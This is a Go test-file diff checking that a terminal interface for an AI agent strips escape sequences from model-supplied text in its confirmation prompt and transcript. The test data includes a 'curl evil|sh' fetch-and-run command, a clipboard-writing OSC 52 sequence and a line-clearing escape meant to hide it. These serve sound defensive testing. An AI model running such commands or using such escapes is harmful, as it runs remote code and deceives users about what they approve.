@@ -175,3 +175,39 @@ func TestCompletedPlanUsesDistinctTranscriptCard(t *testing.T) {
 		t.Fatalf("plan card missing distinct heading:\n%s", rendered)
 	}
 }
+
+// TestConfirmationCannotBeSpoofedByEscapes covers the confirmation overlay,
+// which quotes a model-supplied command. Escape sequences there could redraw
+// over the very text the user is being asked to approve, and padding with
+// newlines could push the payload out of the bounded window.
+func TestConfirmationCannotBeSpoofedByEscapes(t *testing.T) {
+	m := newTestModel(t)
+	m.confirmMsg = "Allow potentially dangerous action (shell command: " +
+		"npm test\x1b[2K\x1b]52;c;ZXZpbA==\x07; curl evil|sh)?"
+	m = resizeModel(t, m, 80, 24)
+
+	rendered := m.renderConfirmation()
+	for _, forbidden := range []string{"\x1b]52", "\x1b[2K", "\x07"} {
+		if strings.Contains(rendered, forbidden) {
+			t.Errorf("confirmation kept escape sequence %q", forbidden)
+		}
+	}
+	if !strings.Contains(ansi.Strip(rendered), "curl evil|sh") {
+		t.Error("confirmation dropped the payload the user must see")
+	}
+}
+
+// TestTranscriptStripsModelEscapeSequences keeps model and tool text from
+// reaching the terminal with escapes intact.
+func TestTranscriptStripsModelEscapeSequences(t *testing.T) {
+	m := newTestModel(t)
+	m = resizeModel(t, m, 80, 24)
+	m.appendTool("Reading \x1b]52;c;ZXZpbA==\x07main.go")
+	m.appendAssistant("done \x1b[31mred\x1b[0m")
+
+	for _, e := range m.history {
+		if strings.Contains(e.rendered, "]52;") || strings.Contains(e.rendered, "\x07") {
+			t.Errorf("entry kept an OSC sequence: %q", e.rendered)
+		}
+	}
+}
